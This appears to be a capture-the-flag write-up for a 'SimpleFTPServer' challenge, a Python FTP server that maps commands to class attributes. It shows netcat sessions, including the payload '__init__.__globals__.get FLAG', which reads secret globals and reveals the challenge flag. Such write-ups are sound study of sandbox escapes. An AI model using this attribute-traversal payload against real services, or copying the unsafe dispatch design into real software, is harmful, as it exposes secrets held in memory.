# SimpleFTPServer
## Background
This challenge is based on [an old python gist](https://gist.github.com/ZoeS17/467387af22de19c028f0430dcfc5ada8) I found a while ago whilst trying to setup a basic, short-lived FTP server. It has an unusual approach to dealing with the extensible nature of FTP... by tying it to the extensible nature of a Python class.

That is, all the FTP commands (i.e. `USER`, `PASS`, `PWD`) were methods on the python class named identically (i.e. `USER()`, `PASS()`, `PWD()`) which when called recieved the user's full data string minus the original command.

So, if an FTP user called the command:

```ftp
USER anonymous
```

The python script would effectively call:

```python
FTPServerThread.USER("anonymous")
```

Interesting approach, right? In any other language this might be a clever way to do it. Though not so in python, where everything is an object and every object has hidden variables used for internal purposes and there is no access-control on code. Suddenly this clever method for determining which method to call has inadvertently opened you up to calling any method referencable in dot notation.

## Attack
**From the attacker's view:** First things first, find the flag location. Now we don't know what the username & password is, but it doesn't matter because it still seems to work regardless. Looking around the file system, we find and interesting folder - `/chal`, which has two files `flag.txt` and `pwn`. Sweet! Let's download `flag.txt`.

```bash
~ nc localhost 1337
220 vsFTPd (v2.3.4) ready...
LIST
150 Here comes the directory listing.
drwxr-xr-x 1 user group 4096 Aug 04 02:02 usr
drwxr-xr-x 1 user group 4096 Aug 04 02:06 lib64
drwxr-xr-x 1 user group 4096 Aug 21 01:13 lib
drwxr-xr-x 1 user group 4096 Aug 21 01:14 bin
drwxr-xr-x 1 user group 4096 Aug 21 01:12 kctf
drwxr-xr-x 1 user group 4096 Aug 22 00:28 chal
226 Directory send OK.
CWD chal
250 OK.
LIST
150 Here comes the directory listing.
-rwxr-xr-x 1 user group 7151 Aug 22 00:28 pwn
-rw-r--r-- 1 user group 27 Aug 20 00:25 flag.txt
226 Directory send OK.
RETR flag.txt
150 Opening data connection.
226 Transfer complete.
DUCTF{- Actually no, I don't feel like giving that up yet. ;)
```

Damn, not quite. Ok, well what's `pwn` then?

```bash
RETR pwn
150 Opening data connection.
226 Transfer complete.
#!/usr/bin/env python3
# Adapted from: https://gist.github.com/ZoeS17/467387af22de19c028f0430dcfc5ada8#file-ftpserver-py-L83
# FTP spec comments borrowed from Wikipedia

import os,time,operator,sys
allow_delete = False
local_ip = '0.0.0.0'
[... snip ...]
```

> **NOTE:** Since this isn't a normal FTP server it won't download via the usual FTP method of creating a second socket and sending it over that, instead it will just throw the entire source code directly into the control socket, hence the use of netcat rather than something like ftpclient.

Looks like we got the source code of an FTP server. Of *this* ftp server, maybe? We can confirm it's the same python program and with some random typing in the netcat seession, where we can get an error referencing `FTPServerThread` and attributes. The same class that the above source code references.

```
~ nc localhost 1337
220 vsFTPd (v2.3.4) ready...
USER anonymous
331 OK.
PASS anonymous
530 Incorrect.
AAaaaa
500 Sorry. 'FTPServerThread' object has no attribute 'AAaaaa'
```

So looks like this entire thing is just a Python class, and that we call the FTP commands based on attributes of the same name on said class - but there is nothing preventing us call *other* non-FTP command attributes.

Huh, and it looks like there is a FLAG in the global scope of the program. I reckon that's what we're searching for.

One attribute that every python class has is `__init__`. This is the classes "initalization function" for all intents and purposes.

Let's try it...

```
➜  ~ nc localhost 1337
220 vsFTPd (v2.3.4) ready...
__init__
500 Sorry. FTPServerThread.__init__() takes 1 positional argument but 2 were given
```

A different error! Huzzah! Looks like we need to give a different amount of arguments though.

```
__init__ param1 param 2
500 Sorry. FTPServerThread.__init__() takes 1 positional argument but 2 were given
```

Interesting, looks like we give the same amount of arguments no matter what we put in. I wonder if our command is being split as a string, where the first "word" is the method name and everything after it is passed as a single String object.

Anyway, if you search around, you might find [some hacking blogs](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#globals-and-locals) discussing about how every function in python has an attribute called `__globals__` which tracks all variables in their globals scope.

Checking `__init__.__globals__` in a local python interpreter, we see it's a [dictionary](https://docs.python.org/3/tutorial/datastructures.html#dictionaries).

```python
➜  ~ python3
Python 3.11.4 (main, Jun 20 2023, 16:59:59) [Clang 14.0.3 (clang-1403.0.22.14.1)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> FLAG="i_want_this"
>>> class MyClass():
...     def __init__(self):
...             pass
... 
>>> x = MyClass()
>>> x.__init__.__globals__
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'FLAG': 'i_want_this', 'MyClass': <class '__main__.MyClass'>, 'x': <__main__.MyClass object at 0x10bb2d190>}
```

We can use `dir()` on this to find all attributes on it

```python
>>> dir(x.__init__.__globals__)
['__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__ior__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__or__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__ror__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']
```

Oh look, the dictionary has an interesting looking function attribute `get`! Looking at the [official python documentation](https://docs.python.org/3/library/stdtypes.html#dict.get), looks like it's a *function* that takes *one string* and then does something. Let's see if we can call `FTPServerThread.__init__.__globals__.get()` with the string `FLAG` and see if it gives us something interesting.

```bash
➜  ~ nc localhost 1337
220 vsFTPd (v2.3.4) ready...
__init__.__globals__.get FLAG
DUCTF{15_this_4_j41lbr34k?}
```

---

> I hope I didn't leave any **FLAG** open to the **global** internet...

Ohhhh I get it now...